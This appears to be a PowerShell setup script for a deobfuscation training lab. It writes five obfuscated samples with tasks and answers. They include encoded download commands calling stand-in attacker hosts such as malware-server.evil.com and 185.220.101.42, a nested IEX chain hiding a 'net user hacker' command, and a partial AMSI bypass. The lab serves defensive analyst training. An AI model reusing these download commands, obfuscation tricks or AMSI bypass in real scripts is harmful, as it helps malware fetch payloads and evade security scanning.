
$ErrorActionPreference = "SilentlyContinue"
Write-Host "[*] === PowerShell Deobfuscation Lab Setup ==="
New-Item -Path C:\LabData -ItemType Directory -Force | Out-Null

# Sample 1: Base64 encoded command (UTF-16LE as PowerShell uses)
$payload1 = 'Invoke-WebRequest -Uri "http://malware-server.evil.com/payload.exe" -OutFile "C:\Users\Public\updater.exe"'
$encoded1 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($payload1))
@"
# === SAMPLE 1: Base64 Encoded Command ===
# Source: Captured from EDR alert on WS-25, EventID 4688
# Process: powershell.exe
# Full command line:

powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -EncodedCommand $encoded1

# TASK: Decode the Base64 string to reveal the original command.
# HINT: PowerShell -EncodedCommand uses UTF-16LE encoding, NOT UTF-8
#
# Decode with:
#   [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String("$encoded1"))
"@ | Set-Content -Path "C:\LabData\Sample1_Base64.ps1"

# Sample 2: String concatenation + char codes
@'
# === SAMPLE 2: String Concatenation & Character Codes ===
# Source: Found in scheduled task action on compromised host

$a = "Ne" + "w-O" + "bje" + "ct"
$b = "Sys" + "tem." + "Net." + "Web" + "Cli" + "ent"
$c = [char]68+[char]111+[char]119+[char]110+[char]108+[char]111+[char]97+[char]100+[char]70+[char]105+[char]108+[char]101 -join ""
$url = -join([char[]](104,116,116,112,58,47,47,49,56,53,46,50,50,48,46,49,48,49,46,52,50,47,116,114,111,106,97,110,46,101,120,101))
$dest = $env:TEMP + "\" + (-join([char[]](115,118,99,104,111,115,116,46,101,120,101)))
# What does this execute?

# TASK: Resolve each variable to understand the full command.
# HINT: [char]68 = 'D', [char]111 = 'o', etc.
# Reconstruct: $a $b -> creates what object?
# $c -> what method?
# $url -> decode all char codes to get URL
# $dest -> decode to get destination path
'@ | Set-Content -Path "C:\LabData\Sample2_Concatenation.ps1"

# Sample 3: Triple-layer IEX
$innerPayload = "Write-Host 'FINAL PAYLOAD: net user hacker P@ss123 /add'"
$layer1 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($innerPayload))
$layer2Code = "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('$layer1'))"
$layer2 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($layer2Code))
$layer3Code = "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('$layer2'))"
$layer3 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($layer3Code))
@"
# === SAMPLE 3: Multi-Layer IEX Chain (3 layers) ===
# Source: Memory dump extraction from powershell.exe process

IEX([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("$layer3")))

# TASK: How many layers of encoding are there? (Answer: 3)
# Decode from outside in:
#   Layer 3 (outermost): decode base64 -> reveals Layer 2
#   Layer 2: decode base64 -> reveals Layer 1
#   Layer 1: decode base64 -> reveals final payload
#
# SAFE METHOD: Replace IEX with Write-Output to see each layer:
#   Write-Output([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("$layer3")))
"@ | Set-Content -Path "C:\LabData\Sample3_MultiLayer.ps1"

# Sample 4: AMSI bypass
@'
# === SAMPLE 4: AMSI Bypass Technique ===
# Source: Captured from PowerShell script block logging

$a = [Ref].Assembly.GetType('System.Management.Automation.'+[char]65+'msi'+[char]85+'tils')
$b = $a.GetField('amsi'+'Init'+'Failed','NonPublic,Static')
# Next line would set $b to $true, disabling AMSI

# TASK: What .NET class is being targeted? (Answer: AmsiUtils)
# TASK: What field is being modified? (Answer: amsiInitFailed)
# TASK: What does setting this to $true accomplish?
#   It tells PowerShell that AMSI initialization failed,
#   so all subsequent script scanning is bypassed.
#
# The obfuscation splits "AmsiUtils" using char codes:
#   [char]65 = 'A', [char]85 = 'U'
#   'Amsi' + 'Utils' -> 'AmsiUtils'
'@ | Set-Content -Path "C:\LabData\Sample4_AMSI.ps1"

# Sample 5: Complex multi-technique
$c2url = "http://185.220.101.42:8080/beacon"
$urlB64 = [Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($c2url))
@"
# === SAMPLE 5: Complex Multi-Technique Obfuscation ===
# Source: Extracted from WMI event subscription on DC-01

`$x = [char[]](73,69,88) -join ""
`$y = [System.Text.Encoding]::ASCII
`$z = "$urlB64"
`$url = `$y.GetString([Convert]::FromBase64String(`$z))
`$f = -join([char[]](36,99,61,78,101,119,45,79,98,106,101,99,116,32,78,101,116,46,87,101,98,67,108,105,101,110,116,59))
`$f += -join([char[]](36,99,46,68,111,119,110,108,111,97,100,83,116,114,105,110,103,40,39))
`$f += `$url
`$f += -join([char[]](39,41))
# Final execution: & ([scriptblock]::Create(`$f))

# TASK: Fully deobfuscate this script.
# 1. What does `$x resolve to? (decode char codes 73,69,88)
# 2. Decode `$z from base64 to get the URL
# 3. Decode `$f char arrays to reconstruct the PowerShell command
# 4. List ALL IOCs: URLs, IPs, file paths
"@ | Set-Content -Path "C:\LabData\Sample5_Complex.ps1"

@"
=== PowerShell Deobfuscation Lab ===

Samples:
  Sample1_Base64.ps1         - Base64 encoded command (UTF-16LE)
  Sample2_Concatenation.ps1  - String concatenation + char codes
  Sample3_MultiLayer.ps1     - Triple-layer IEX chain
  Sample4_AMSI.ps1           - AMSI bypass technique
  Sample5_Complex.ps1        - Multi-technique obfuscation

Deobfuscation toolkit:
  # Decode Base64 (UTF-16LE - PowerShell's default)
  [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String("..."))

  # Decode Base64 (ASCII/UTF-8)
  [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("..."))

  # Convert char codes
  [char[]](72,101,108,108,111) -join ""

  # Safe execution (replace IEX with Write-Output)
  Write-Output instead of Invoke-Expression
"@ | Set-Content -Path "C:\LabData\README.txt"

Write-Host "[+] PowerShell Deobfuscation lab ready."
